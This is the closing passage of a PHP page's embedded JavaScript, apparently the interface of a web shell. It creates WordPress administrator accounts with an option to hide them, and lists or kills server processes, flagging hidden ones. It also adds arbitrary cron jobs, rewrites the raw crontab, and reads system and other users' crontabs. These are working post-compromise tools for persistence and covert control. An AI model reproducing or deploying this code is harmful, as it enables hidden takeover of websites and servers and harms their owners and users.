    if (!user || !pass) { wpShowStatus('Username and password required.', 'err'); return; }
    var data = {c4t: 'cadm', xun: user, xpw: pass, xem: email};
    if (hide) data.hide_user = '1';
    wpShowStatus('Creating...', 'ok');
    wpRequest(data, function(r) {
        if (r.ok) {
            var msg = 'Admin "' + r.u + '" created. Pass: ' + r.p;
            if (r.hide) msg += ' (Hidden)';
            wpShowStatus(msg, 'ok');
            document.getElementById('wpNewUser').value = '';
            document.getElementById('wpNewPass').value = '';
            document.getElementById('wpNewEmail').value = '';
            document.getElementById('wpHideUser').checked = false;
            wpLoadUsers();
        } else {
            wpShowStatus('Error: ' + (r.err || 'unknown'), 'err');
        }
    });
}

function wpShowStatus(msg, type) {
    var el = document.getElementById('wpCreateStatus');
    el.style.display = 'block';
    el.textContent = msg;
    el.style.background = type === 'ok' ? 'rgba(63,185,80,0.1)' : 'rgba(248,81,73,0.1)';
    el.style.border = '1px solid ' + (type === 'ok' ? '#3fb950' : '#f85149');
    el.style.color = type === 'ok' ? '#3fb950' : '#f85149';
    if (type === 'ok' && msg !== 'Creating...') {
        setTimeout(function(){ el.style.display = 'none'; }, 8000);
    }
}

// === PROCESS MANAGER ===
var procData = null;
var procTimer = null;
var procPaused = false;
var procKillTarget = null;
var procCurrentUser = '<?php echo get_current_user(); ?>';

function procRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: 'Parse error'}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function procStart() {
    procPaused = false;
    var btn = document.getElementById('procPauseBtn');
    if (btn) btn.textContent = 'Pause';
    procLoad();
    if (procTimer) clearInterval(procTimer);
    procTimer = setInterval(function() {
        if (!procPaused) procLoad();
    }, 3000);
}

function procStopAndClose() {
    if (procTimer) { clearInterval(procTimer); procTimer = null; }
    hideModal('proc');
}

function procTogglePause() {
    procPaused = !procPaused;
    var btn = document.getElementById('procPauseBtn');
    btn.textContent = procPaused ? 'Resume' : 'Pause';
    var indicator = document.getElementById('procLiveIndicator');
    indicator.style.background = procPaused ? '#f97316' : '#3fb950';
    indicator.style.animation = procPaused ? 'none' : 'procPulse 1s infinite';
}

function procLoad() {
    procRequest({proc_action: 'list'}, function(r) {
        if (r.err) {
            document.getElementById('procTableBody').innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;color:#f85149;">' + r.err + '</td></tr>';
            return;
        }
        procData = r;
        // Stats
        document.getElementById('procStats').textContent = r.total + ' processes | ' + r.total_hidden + ' hidden | ' + r.total_recent + ' recent';
        // Alerts
        var alerts = document.getElementById('procAlerts');
        var alertHtml = '';
        if (r.total_hidden > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(248,81,73,0.15);border:1px solid #f85149;color:#f85149;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>';
            alertHtml += r.total_hidden + ' HIDDEN PROCESS DETECTED</span>';
        }
        if (r.total_recent > 0) {
            alertHtml += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(63,185,80,0.15);border:1px solid #3fb950;color:#3fb950;padding:3px 10px;border-radius:4px;font-size:10px;font-weight:600;">';
            alertHtml += '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>';
            alertHtml += r.total_recent + ' recently started (&lt;5min)</span>';
        }
        alerts.innerHTML = alertHtml;
        procFilterRender();
    });
}

function procFilterRender() {
    if (!procData) return;
    var search = (document.getElementById('procSearch').value || '').toLowerCase();
    var filter = document.getElementById('procFilter').value;
    var sort = document.getElementById('procSort').value;

    // Build combined list
    var list = [];

    // Hidden processes
    if (filter === 'all' || filter === 'hidden') {
        (procData.hidden || []).forEach(function(h) {
            list.push({
                pid: h.pid, user: h.user, cpu: '?', mem: '?', vsz: '?', rss: '?',
                tty: '?', stat: '?', start: '?', time: '?', command: h.command,
                _type: 'hidden'
            });
        });
    }

    // Normal processes
    var recentPids = {};
    (procData.recent || []).forEach(function(r) { recentPids[r.pid] = r.age_seconds; });

    var procs = procData.processes || [];
    procs.forEach(function(p) {
        var type = 'normal';
        if (recentPids[p.pid] !== undefined) type = 'recent';
        if (filter === 'hidden') return;
        if (filter === 'mine' && p.user !== procCurrentUser) return;
        if (filter === 'recent' && type !== 'recent') return;
        p._type = type;
        if (type === 'recent') p._age = recentPids[p.pid];
        list.push(p);
    });

    // Search
    if (search) {
        list = list.filter(function(p) {
            return (p.pid + ' ' + p.user + ' ' + p.command + ' ' + p.stat).toLowerCase().indexOf(search) >= 0;
        });
    }

    // Sort
    list.sort(function(a, b) {
        if (a._type === 'hidden' && b._type !== 'hidden') return -1;
        if (b._type === 'hidden' && a._type !== 'hidden') return 1;
        if (sort === 'cpu') return parseFloat(b.cpu || 0) - parseFloat(a.cpu || 0);
        if (sort === 'mem') return parseFloat(b.mem || 0) - parseFloat(a.mem || 0);
        if (sort === 'pid') return parseInt(b.pid || 0) - parseInt(a.pid || 0);
        if (sort === 'start') return 0;
        return 0;
    });

    // Render
    var html = '';
    if (list.length === 0) {
        html = '<tr><td colspan="8" style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No matching processes.</td></tr>';
    }
    list.forEach(function(p) {
        var rowClass = 'proc-row';
        var badge = '';
        if (p._type === 'hidden') {
            rowClass += ' proc-hidden';
            badge = '<span style="background:#f85149;color:#fff;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">HIDDEN</span>';
        } else if (p._type === 'recent') {
            rowClass += ' proc-recent';
            var ageStr = p._age !== undefined ? p._age + 's ago' : 'new';
            badge = '<span style="background:#3fb950;color:#000;padding:1px 5px;border-radius:3px;font-size:8px;font-weight:700;margin-left:4px;">NEW ' + ageStr + '</span>';
        }

        var cpuClass = parseFloat(p.cpu) > 50 ? ' proc-high-cpu' : '';
        var memClass = parseFloat(p.mem) > 50 ? ' proc-high-mem' : '';

        var cmdShort = (p.command || '').length > 80 ? p.command.substring(0, 80) + '...' : (p.command || '');
        var cmdEsc = cmdShort.replace(/</g, '&lt;').replace(/>/g, '&gt;');
        var cmdFullEsc = (p.command || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');

        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;color:#ec4899;font-family:monospace;font-weight:600;white-space:nowrap;">' + p.pid + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.user || '?') + '</td>';
        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + cpuClass + '">' + (p.cpu || '?') + '</td>';
        html += '<td style="padding:5px 8px;text-align:right;font-family:monospace;white-space:nowrap;" class="' + memClass + '">' + (p.mem || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);font-family:monospace;white-space:nowrap;">' + (p.stat || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-muted);white-space:nowrap;">' + (p.start || '?') + '</td>';
        html += '<td style="padding:5px 8px;color:var(--text-primary);font-family:monospace;font-size:10px;" title="' + cmdFullEsc + '">' + cmdEsc + badge + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;white-space:nowrap;">';
        if (p.pid && p.pid !== '?') {
            html += '<button class="btn btn-sm btn-danger" style="padding:2px 8px;font-size:9px;" onclick="procKill(' + p.pid + ',\'' + cmdShort.replace(/'/g, "\\'").replace(/"/g, '&quot;') + '\')">Kill</button>';
        }
        html += '</td>';
        html += '</tr>';
    });

    document.getElementById('procTableBody').innerHTML = html;
}

function procKill(pid, cmd) {
    procKillTarget = pid;
    document.getElementById('procKillPid').textContent = '#' + pid;
    document.getElementById('procKillCmd').textContent = cmd;
    showModal('procKill');
}

function procDoKill(sig) {
    if (!procKillTarget) return;
    var killedPid = procKillTarget;
    procRequest({proc_action: 'kill', pid: procKillTarget, signal: sig}, function(r) {
        hideModal('procKill');
        if (r.ok) {
            showToast('Signal <b>-' + sig + '</b> sent to PID <b>' + killedPid + '</b>', 'success', 4000, 'applepay');
        } else {
            showToast('Failed to kill PID ' + killedPid + ': ' + (r.err || ''), 'error');
            playFailSound();
        }
        procKillTarget = null;
        if (!procPaused) procLoad();
    });
}

// === CRONJOB MANAGER ===
var cronData = null;
var cronTimer = null;
var cronPaused = false;
var cronCurrentTab = 'user';
var cronRawVisible = false;

function cronRequest(data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        try { callback(JSON.parse(xhr.responseText)); }
        catch(e) { callback({err: 'Parse error: ' + xhr.responseText.substring(0, 200)}); }
    };
    xhr.onerror = function() { callback({err: 'Network error'}); };
    var params = [];
    for (var key in data) params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    xhr.send(params.join('&'));
}

function cronStart() {
    cronPaused = false;
    document.getElementById('cronPauseBtn').textContent = 'Pause';
    cronLoad();
    if (cronTimer) clearInterval(cronTimer);
    cronTimer = setInterval(function() {
        if (!cronPaused) cronLoad();
    }, 5000);
}

function cronStopAndClose() {
    if (cronTimer) { clearInterval(cronTimer); cronTimer = null; }
    hideModal('cron');
}

function cronTogglePause() {
    cronPaused = !cronPaused;
    document.getElementById('cronPauseBtn').textContent = cronPaused ? 'Resume' : 'Pause';
    document.getElementById('cronLiveIndicator').style.background = cronPaused ? '#f97316' : '#3fb950';
    document.getElementById('cronLiveIndicator').style.animation = cronPaused ? 'none' : 'cronPulse 1s infinite';
}

function cronLoad() {
    cronRequest({cron_action: 'list'}, function(r) {
        if (r.err) {
            document.getElementById('cronUserBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:20px;color:#f85149;">' + r.err + '</td></tr>';
            return;
        }
        cronData = r;
        var active = 0, disabled = 0;
        (r.user_crons || []).forEach(function(c) {
            if (!c.is_var && !c.is_comment) active++;
            else if (c.is_comment && c.schedule) disabled++;
        });
        document.getElementById('cronStats').textContent = 'User: ' + r.current_user + ' | ' + active + ' active | ' + disabled + ' disabled | sys: ' + (r.sys_crons || []).length;
        cronRenderUser();
        cronRenderSys();
        cronRenderOther();
        document.getElementById('cronEtcContent').textContent = r.etc_crontab || '[not readable]';
    });
}

function cronRenderUser() {
    if (!cronData) return;
    var crons = cronData.user_crons || [];
    if (crons.length === 0) {
        document.getElementById('cronUserBody').innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--text-muted);font-size:11px;">No crontab entries. Add one above.</td></tr>';
        return;
    }
    var html = '';
    crons.forEach(function(c, i) {
        var rowClass = 'cron-row';
        if (!c.enabled) rowClass += ' cron-disabled';
        if (c.is_var) rowClass += ' cron-var';
        var statusBadge = '';
        if (c.is_var) {
            statusBadge = '<span style="background:#f97316;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">VAR</span>';
        } else if (!c.enabled && c.schedule) {
            statusBadge = '<span style="background:#6b7280;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">OFF</span>';
        } else if (c.enabled && c.schedule) {
            statusBadge = '<span style="background:#3fb950;color:#000;padding:1px 6px;border-radius:3px;font-size:8px;">ON</span>';
        } else if (c.is_comment) {
            statusBadge = '<span style="background:#4b5563;color:#fff;padding:1px 6px;border-radius:3px;font-size:8px;">NOTE</span>';
        }
        var schedDisp = c.schedule ? ('<code style="background:rgba(6,182,212,0.15);color:#06b6d4;padding:2px 6px;border-radius:3px;font-size:10px;">' + esc(c.schedule) + '</code>') : '<span style="color:var(--text-muted);">-</span>';
        var humanSchedule = cronHumanize(c.schedule);
        if (humanSchedule) schedDisp += '<br><span style="font-size:9px;color:var(--text-muted);">' + humanSchedule + '</span>';
        var cmdEsc = esc(c.command || c.raw);
        var cmdShort = cmdEsc.length > 80 ? cmdEsc.substring(0, 80) + '...' : cmdEsc;
        html += '<tr class="' + rowClass + '" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;text-align:center;color:var(--text-muted);font-size:10px;">' + (i + 1) + '</td>';
        html += '<td style="padding:5px 8px;white-space:nowrap;">' + statusBadge + '</td>';
        html += '<td style="padding:5px 8px;">' + schedDisp + '</td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:10px;color:var(--text-primary);" title="' + cmdEsc + '">' + cmdShort + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;white-space:nowrap;">';
        if (c.schedule && !c.is_var) {
            var toggleLabel = c.enabled ? 'Disable' : 'Enable';
            var toggleColor = c.enabled ? '#f97316' : '#3fb950';
            html += '<button class="btn btn-sm" style="padding:2px 6px;font-size:9px;background:' + toggleColor + ';border-color:' + toggleColor + ';color:#fff;margin-right:3px;" onclick="cronToggle(' + i + ')">' + toggleLabel + '</button>';
        }
        html += '<button class="btn btn-sm btn-danger" style="padding:2px 6px;font-size:9px;" onclick="cronDelete(' + i + ')">Del</button>';
        html += '</td></tr>';
    });
    document.getElementById('cronUserBody').innerHTML = html;
}

function cronRenderSys() {
    if (!cronData) return;
    var sys = cronData.sys_crons || [];
    if (sys.length === 0) {
        document.getElementById('cronSysBody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No system cron files found or not readable.</td></tr>';
        return;
    }
    var html = '';
    sys.forEach(function(s) {
        var contentShort = s.content.length > 120 ? s.content.substring(0, 120) + '...' : s.content;
        html += '<tr class="cron-row" style="border-bottom:1px solid var(--border);">';
        html += '<td style="padding:5px 8px;white-space:nowrap;"><span style="background:rgba(6,182,212,0.15);color:#06b6d4;padding:1px 6px;border-radius:3px;font-size:9px;">' + esc(s.dir) + '</span></td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:10px;color:#06b6d4;">' + esc(s.name) + '</td>';
        html += '<td style="padding:5px 8px;font-family:monospace;font-size:9px;color:var(--text-muted);white-space:pre-wrap;word-break:break-all;" title="' + esc(s.content) + '">' + esc(contentShort) + '</td>';
        html += '<td style="padding:5px 8px;text-align:center;">' + (s.writable ? '<span style="color:#3fb950;">Yes</span>' : '<span style="color:#f85149;">No</span>') + '</td>';
        html += '</tr>';
    });
    document.getElementById('cronSysBody').innerHTML = html;
}

function cronRenderOther() {
    if (!cronData) return;
    var others = cronData.other_users || [];
    if (others.length === 0) {
        document.getElementById('cronOtherBody').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:11px;">No other user crontabs found or not readable.</div>';
        return;
    }
    var html = '';
    others.forEach(function(o) {
        html += '<div style="margin-bottom:10px;border:1px solid var(--border);border-radius:6px;overflow:hidden;">';
        html += '<div style="background:var(--bg-secondary);padding:6px 10px;font-size:11px;font-weight:600;color:#06b6d4;border-bottom:1px solid var(--border);">' + esc(o.user) + '</div>';
        html += '<pre style="padding:8px;font-size:10px;color:var(--text-primary);margin:0;white-space:pre-wrap;word-break:break-all;">' + esc(o.content) + '</pre>';
        html += '</div>';
    });
    document.getElementById('cronOtherBody').innerHTML = html;
}

function cronSwitchTab(tab) {
    cronCurrentTab = tab;
    ['user', 'sys', 'other'].forEach(function(t) {
        document.getElementById('cronTab' + t.charAt(0).toUpperCase() + t.slice(1)).style.borderColor = (t === tab) ? '#06b6d4' : '';
        document.getElementById('cronTab' + t.charAt(0).toUpperCase() + t.slice(1)).style.color = (t === tab) ? '#06b6d4' : '';
        var el = document.getElementById('cron' + t.charAt(0).toUpperCase() + t.slice(1) + 'Tab');
        if (el) el.style.display = (t === tab) ? '' : 'none';
    });
    document.getElementById('cronEtcSection').style.display = (tab === 'sys') ? '' : 'none';
}

function cronApplyPreset() {
    var v = document.getElementById('cronPreset').value;
    if (v) document.getElementById('cronSchedule').value = v;
    document.getElementById('cronPreset').selectedIndex = 0;
}

function cronAdd() {
    var schedule = document.getElementById('cronSchedule').value.trim();
    var command = document.getElementById('cronCommand').value.trim();
    if (!schedule || !command) { showToast('Schedule and command are required', 'warning'); return; }
    cronRequest({cron_action: 'add', schedule: schedule, command: command}, function(r) {
        if (r.err) { showToast('Add cron failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob added: <b>' + schedule + '</b>', 'success', 4000, 'applepay');
        document.getElementById('cronSchedule').value = '';
        document.getElementById('cronCommand').value = '';
        cronLoad();
    });
}

function cronToggle(idx) {
    cronRequest({cron_action: 'toggle', idx: idx}, function(r) {
        if (r.err) { showToast('Toggle failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob toggled successfully', 'success', 4000, 'applepay');
        cronLoad();
    });
}

function cronDelete(idx) {
    if (!confirm('Delete this cron entry?')) return;
    cronRequest({cron_action: 'delete', idx: idx}, function(r) {
        if (r.err) { showToast('Delete cron failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Cronjob entry deleted', 'success', 4000, 'applepay');
        cronLoad();
    });
}

function cronToggleRaw() {
    cronRawVisible = !cronRawVisible;
    document.getElementById('cronRawEditor').style.display = cronRawVisible ? '' : 'none';
    if (cronRawVisible && cronData) {
        document.getElementById('cronRawText').value = cronData.raw || '';
    }
}

function cronSaveRaw() {
    var raw = document.getElementById('cronRawText').value;
    cronRequest({cron_action: 'save_raw', raw: raw}, function(r) {
        if (r.err) { showToast('Save crontab failed: ' + r.err, 'error'); playFailSound(); return; }
        showToast('Crontab saved successfully', 'success', 4000, 'applepay');
        cronRawVisible = false;
        document.getElementById('cronRawEditor').style.display = 'none';
        cronLoad();
    });
}

function cronHumanize(schedule) {
    if (!schedule) return '';
    var map = {
        '* * * * *': 'Every minute', '*/5 * * * *': 'Every 5 minutes', '*/10 * * * *': 'Every 10 minutes',
        '*/15 * * * *': 'Every 15 minutes', '*/30 * * * *': 'Every 30 minutes', '0 * * * *': 'Every hour',
        '0 */2 * * *': 'Every 2 hours', '0 */6 * * *': 'Every 6 hours', '0 */12 * * *': 'Every 12 hours',
        '0 0 * * *': 'Daily at midnight', '0 0 * * 0': 'Weekly on Sunday', '0 0 * * 1': 'Weekly on Monday',
        '0 0 1 * *': 'Monthly on the 1st', '@reboot': 'On reboot', '@yearly': 'Once a year',
        '@annually': 'Once a year', '@monthly': 'Once a month', '@weekly': 'Once a week',
        '@daily': 'Once a day', '@hourly': 'Once an hour',
    };
    return map[schedule] || '';
}

function esc(s) {
    if (!s) return '';
    var d = document.createElement('div');
    d.appendChild(document.createTextNode(s));
    return d.innerHTML;
}
</script>

<?php endif; ?>
</body>
</html>
